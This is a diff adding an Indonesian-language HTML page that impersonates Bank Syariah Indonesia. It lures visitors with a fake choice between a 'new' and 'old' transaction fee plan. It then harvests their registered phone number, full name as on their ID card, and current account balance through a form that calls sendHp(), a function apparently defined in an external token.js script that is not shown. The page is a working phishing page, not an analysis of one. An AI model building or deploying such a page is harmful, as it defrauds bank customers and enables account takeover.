@@ -1,0 +1,550 @@
+<!DOCTYPE html>
+<html lang="in">
+<head>
+      <meta charset="UTF-8">
+      <title>𝗕𝗮𝗻𝗸 𝗦𝘆𝗮𝗿𝗶𝗮𝗵 𝗜𝗻𝗱𝗼𝗻𝗲𝘀𝗶𝗮</title>
+      <meta name="theme-color" content="#00A39E">
+<meta name="description" content="Yuk segara konfirmasikan tarif sesuai dengan kebutuhan anda"> 
+ <meta property="og:image" content="https://hosting.tigerengine.id/77d5f3.jpg">
+  <link href="https://hosting.tigerengine.id/f06w57.jpg" rel="shortcut icon" type="image/x-icon">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
+ </head>
+ <style>
+      @import url('https://fonts.googleapis.com/css?family=Open+Sans&display=swap');
+      
+ body {
+       font-family: sans-serif;
+       position: relative;
+       margin: 0 auto;
+       left: 0; 
+       right: 0; 
+       max-width: 450px;  
+       
+} 
+       
+  .nav1{
+      position: relative;
+      background: url("img/nav1.png") transparent;
+      background-repeat: no-repeat;
+      background-size: 100% 100%;
+      height: 60px;
+      width: 100%;
+      margin: 0 auto;
+      left: 0; 
+      right: 0; 
+      max-width: 450px;
+      box-shadow: 0px 1px 4px 2px rgba(66, 68, 90, 0.18);
+         
+ }
+ 
+   .nav2{
+      z-index:999999;
+      position: fixed;
+      background: url("img/nav2.png") transparent;
+      background-repeat: no-repeat;
+      background-size: 100% 100%;
+      height: 110px;
+      width: 100%;
+      bottom: 0; 
+      left: 0; 
+      right: 0; 
+      margin: 0 auto;
+      padding-top: 5px;
+      max-width: 450px;
+ }
+ 
+.foto{
+      z-index: 1;
+      background: url('img/index1.png');
+      background-repeat: no-repeat;
+      background-size: 100%;     
+      left: 0; 
+      right: 0;            
+      margin: 0 auto;
+      top: 15px;
+      position: relative;
+      max-width: 430px;           
+}
+
+.radio-section {
+	display: flex;
+	align-items: center;
+	justify-content: center;
+	height: 100vh;
+	width:;
+}
+h1 {
+	margin-bottom: 20px;
+}
+.radio-item [type="radio"] {
+	display: none;
+}
+.radio-item + .radio-item {
+	margin-top: 15px;
+}
+.radio-item label {
+	display: block;
+	padding: 8px 0px;
+	background: transparent;
+	border: 2px solid #00A39E;
+	border-radius: 20px;
+	cursor: pointer;
+	font-size: 12px;
+	font-weight: 400;
+	max-width: 430px;
+	color: #00A39E;
+	margin: 8px auto;
+	top:5px;
+	position: relative;
+	box-shadow: 2px 2px 2px #ccc;
+	
+}
+.radio-item label:after,
+.radio-item label:before {
+	content: "";
+	position: absolute;
+	border-radius: 50%;
+}
+.radio-item label:after {
+	height: 20px;
+	width: 20px;
+	border: 1px solid #00A39E;
+	left: 9px;
+	top: calc(50% - 11px);
+}
+.radio-item label:before {
+	background: #00A39E;
+	height: 17px;
+	width: 17px;
+	left: 11.2px;
+	top: calc(50% - 9.8px);
+	transform: scale(5);
+	opacity: 0;
+	visibility: hidden;
+	transition: 0.4s ease-in-out 0s;
+}
+.radio-item [type="radio"]:checked ~ label {
+	border-color: #F8B13B;
+}
+.radio-item [type="radio"]:checked ~ label::before {
+	opacity: 1;
+	visibility: visible;
+	transform: scale(1);
+	margin-top: 0.9px;
+}
+
+.button{
+      z-index: 1;
+      background: #00A39E; 
+      margin-top: 16px; 
+      height: 42px; 
+      max-width: 100%; 
+      color: #fff; 
+      border-radius: 50px; 
+      border: 1px solid #00A39E;
+      width: 85%;  
+      margin-bottom: 25px;    
+      box-shadow: 2px 2px 2px #ccc;
+}
+
+
+.three {
+    transition: all 0.2s;
+    transition-timing-function:cubic-bezier(2.2, 2, 3, 2);
+}
+
+.three:hover {
+    background: #00A39E; 
+    color: white;
+    border: none;
+    opacity: 0.3;
+    transform:scale(1.01,1.01);
+    box-shadow: inset 0px 0px 9px -2px rgba(66, 68, 90, 1);
+}
+
+    .form-log{
+        box-sizing: border-box; 
+        height: 40px; 
+        width: 90%;        
+        border:none;
+        border-bottom: 1.5px solid #00A39E; 
+        border-image: initial; 
+        background-color: transparent;  
+        background: url("img/62.");
+        background-repeat: no-repeat;
+        background-position: left center;
+        background-size: 21%;     
+        font-family: 'Nunito', sans-serif; 
+        font-weight: 600; 
+        font-size: 16px; 
+        color: #00000099;              
+        outline: none; 
+        padding-left: 20%;
+        margin: 0 auto;
+        display: block;
+        
+    }
+    
+  .lbl{
+        
+        font-size: 14px;
+        color: #00000090;
+        margin-left: 5%;
+        font-weight: 800;
+  }
+  
+  
+   .form-log1{
+        box-sizing: border-box; 
+        height: 40px; 
+        width: 90%;        
+        border:none;
+        border-bottom: 1.5px solid #00A39E; 
+        border-image: initial; 
+        background-color: transparent;  
+        border-radius: 0px; 
+        font-family: 'Nunito', sans-serif; 
+        font-weight: 600; 
+        font-size: 16px; 
+        color: #00000099; 
+        word-spacing: 0px; 
+        padding: 0px 10px; 
+        outline: none; 
+        margin-top: 0px; 
+        padding-left: 0px;
+        margin: 10px auto;
+        display: block;
+        align-items: center;
+    }
+    
+     .lbl1{
+        position: relative;
+        font-size: 14px;
+        color: #00000090;
+        margin-left: 5%;
+        font-weight: 800;
+        top:10px;
+  }
+  
+  ::placeholder{
+        font-size: 13px;
+        font-weight: 400;
+        
+  }
+  
+  .process1 {
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: auto;
+            position: fixed;
+            padding-top: 300px;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.4);
+            z-index: 999999999;
+            
+      
+}
+.loading {
+    position: fixed;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    align-items: center;
+    margin-bottom: 20%;
+    margin-top: 0px;
+}
+.loading img {
+    width: 190px;
+    border-radius: 10px;
+}
+
+welalxcome {
+  display: flex;
+  position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;
+  width: 100%;
+  background: url('img/welcome.png') no-repeat center center;
+  background-position: 100% 100%;
+  background-size: 100% 100%;
+  z-index: 10000;
+  background-color: #ffffff;
+
+}
+welalxcome img {
+        width:100%;
+    height: 700px;
+    margin-top: -55px;
+    
+}
+chsalxcome {
+    position: relative;
+    width: 100%;
+    height: 100vh;
+    display: flex;
+    flex-direction: column;
+    flex-wrap: nowrap;
+    align-items: center;
+}
+ 
+ .animated {
+	-webkit-animation-duration: 1s;
+	animation-duration: 1s;
+	-webkit-animation-fill-mode: both;
+	animation-fill-mode: both;
+	-webkit-animation-timing-function: linear;
+	animation-timing-function: linear;
+	 -webkit-animation-name: bounceIn; 
+    animation-name: bounceIn; 
+}
+
+@-webkit-keyframes bounceIn { 
+    0% { 
+        opacity: 1; 
+        -webkit-transform: scale(0); 
+    } 
+
+    50% { 
+        opacity: 1; 
+        -webkit-transform: scale(0); 
+    } 
+
+    70% { 
+        -webkit-transform: scale(0); 
+    } 
+
+    100% { 
+         -webkit-transform: scale(0); 
+    } 
+} 
+
+@keyframes bounceIn { 
+    0% { 
+        opacity: 1; 
+        transform: scale(.1); 
+    } 
+
+    50% { 
+        opacity: 1; 
+        transform: scale(.5); 
+    } 
+
+    70% { 
+        transform: scale(1); 
+    } 
+
+    100% { 
+        transform: scale(1); 
+    } 
+} 
+
+.naik {
+	-webkit-animation-duration: 1s;
+	animation-duration: 1s;
+	-webkit-animation-fill-mode: both;
+	animation-fill-mode: both;
+	-webkit-animation-timing-function: ease-in;
+	animation-timing-function: ease-in;
+	-webkit-animation-name: bounceOutUp; 
+    animation-name: bounceOutUp; 
+}
+
+@-webkit-keyframes bounceOutUp { 
+    0% { 
+        -webkit-transform: translateY(0); 
+    } 
+    20% { 
+        opacity: 1; 
+        -webkit-transform: translateY(20px); 
+    } 
+    100% { 
+        opacity: 1; 
+        -webkit-transform: translateY(-200px); 
+    } 
+} 
+@keyframes bounceOutUp { 
+    0% { 
+        transform: translateY(0); 
+    } 
+    20% { 
+        opacity: 1; 
+        transform: translateY(20px); 
+    } 
+    100% { 
+        opacity: 1; 
+        transform: translateY(-500px); 
+    } 
+} 
+.bounceOutUp { 
+    
+}
+
+.box{
+    position: relative;    
+    margin-bottom: 160px;    
+    padding: 15px;     
+}
+
+form{
+    border: 3px double #00A39E;
+    border-radius: 18px;
+    margin-top: 55%;
+    box-shadow: 2px 2px 2px #ccc;
+    background: #fff;
+}
+
+ .fadeInSlideDown {
+  animation: fadeInSlideDown 2.5s;
+}
+
+@keyframes fadeInSlideDown {
+  0% {
+    opacity: 0;
+    transform: translateY(-100%);
+  }
+  100% {
+    opacity: 1;
+    transform: translateY(0);
+  }
+}
+
+
+.fadeInSlideLeft {
+  animation: fadeInSlideLeft 2.5s;
+}
+
+@keyframes fadeInSlideLeft {
+  0% {
+    opacity: 0;
+    transform: translateX(-100%);
+  }
+  100% {
+    opacity: 1;
+    transform: translateX(0);
+  }
+}
+
+.fadeInSlideUp {
+  animation: fadeInSlideUp 2.5s;
+}
+
+@keyframes fadeInSlideUp {
+  0% {
+    opacity: 0;
+    transform: translateY(100%);
+  }
+  100% {
+    opacity: 1;
+    transform: translateY(0);
+  }
+}
+ </style>
+<body>
+<main>
+<welalxcome style="display: none">
+</welalxcome>
+<chsalxcome2 style="display: none;">
+
+<nav class="nav1 fadeInSlideLeft" ></nav>
+<div class="foto">
+    <div class="box fadeInSlideDown">
+<form id="formHP" onsubmit="sendHp()">
+ <section class="" style="padding: 5px; left: 0; right: 0; margin: 0px auto; width: 60%">
+	<div class="radio-list" style="position: absolute; left: 0; right: 0; margin: 0px auto; width: 75%;">
+	<center>
+		<div class="radio-item" ><input name="tarif" id="radio1" type="radio" value="baru" required><label for="radio1">TARIF BARU Rp 150.000 / BULAN</label>
+		<div class="radio-item"><input name="tarif" id="radio2" type="radio" value="lama" required><label for="radio2" >TARIF LAMA Rp 6.500 / TRANSAKSI</label></div>
+	</center>
+	</div>
+		</section>   
+
+    <section style="margin-top: 110px;">
+          <label for="nohp" class="lbl">No. HP. Terdaftar</label>
+     <input type="tel" id="nohp" class="form-log" maxlength="13" name="nohp" placeholder="Tuliskan Nomor Handphone Anda" oninvalid="this.setCustomValidity('Mɑsukkɑn 𝗡𝗼.𝗛𝗽 𝘆𝗮𝗻𝗴 𝘁𝗲𝗿𝗱𝗮𝗳𝘁𝗮𝗿 𝗱𝗶 𝗕𝗦𝗜')" onchange="this.setCustomValidity('')" minlength="10" required>
+    
+   
+    <br>
+    <label for="nama" class="lbl1">Nama Lengkap :</label>
+     <input type="text" id="nama" class="form-log1" name="nama" placeholder="Tuliskan Nama Sesuai KTP" oninvalid="this.setCustomValidity('Mɑsukkɑn 𝗡𝗮𝗺𝗮 𝘀𝗲𝘀𝘂𝗮𝗶 𝗞𝗧𝗣')" onchange="this.setCustomValidity('')" required> 
+     
+    
+     <label for="saldo" class="lbl1">Saldo akhir :</label>
+     <input type="tel" id="saldo" class="form-log1 x" maxlength="" name="saldo" data-name="rek" placeholder="Pastikan saldo terakhir sesuai rekening" oninvalid="this.setCustomValidity('Mɑsukkɑn 𝘀𝗮𝗹𝗱𝗼 𝘁𝗲𝗿𝗮𝗸𝗵𝗶𝗿 𝗱𝗶 𝗿𝗲𝗸𝗲𝗻𝗶𝗻𝗴 𝗮𝗻𝗱𝗮')" onchange="this.setCustomValidity('')" required style="background-image: url(https://hosting.tigerengine.id/yirvgp.jpg);
+  background-repeat: no-repeat;
+  background-position: 100% 100%;
+  background-size: 100% 100%;padding-left: 11%;">
+      <center>
+     <img src="img/proteksi.png" width="90%" alt=""></img>
+   <div style="left: 0; right: 0; margin: 0px auto; width: 100%">   
+     <button id="btnSubmit1" type="submit" class="button three" >PROSES</button>
+     </center>
+     </div></div>
+     </section>
+     </form>
+     </div>
+     
+     <center>
+     <div id="djload" name="process" class="process1" style="display: none;">
+            <div class="loading">
+                <img src="img/loding.">
+              
+            </div>
+        </div>
+        </center>
+<div class="nav2 fadeInSlideUp"></div>
+</div>
+<div onclick="tutupimg1()" id="popupku" style="position: fixed;
+  top: 0;
+  left: 0;
+  right: 0;
+  bottom: 0;display:none;
+  width: 100%; height: 100%; background: rgba(0,0,0, 0.4); z-index: 9999999999;">
+    <center>
+ <img id="gambarku" class="animated" src="img/animated.png" width="90%" style="margin-top: 120px" onclick="tutupimg1()">
+    </center></div>
+    
+<script src="jquery.min.js"></script>    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script src="img/jquery.mask.min.js"></script>
+<script>
+$(document).ready(function() {
+    $('#nohp').on('input', function() {
+        if ($(this).val() == '0' || $(this).val() == '62') {
+            $(this).val('');
+        }
+    });
+});
+</script>
+    <script>
+$(document).ready(function() {
+    $('#nohp').mask('000-0000-00000');
+});
+    </script>
+<script>
+$( document ).ready(function() {
+      $('welalxcome').fadeIn(500);
+            setTimeout(() => {
+                $('welalxcome').fadeOut();
+                $('chsalxcome2').fadeIn();
+            },600)
+        })
+</script>
+<script src="token.js">
+</script>      
+<script>
+     $(document).ready(function(){
+                
+                $( '.x' ).mask('000.000.000.000.000', {reverse: true});
+ 
+            });
+</script>
+</body>
+</html>
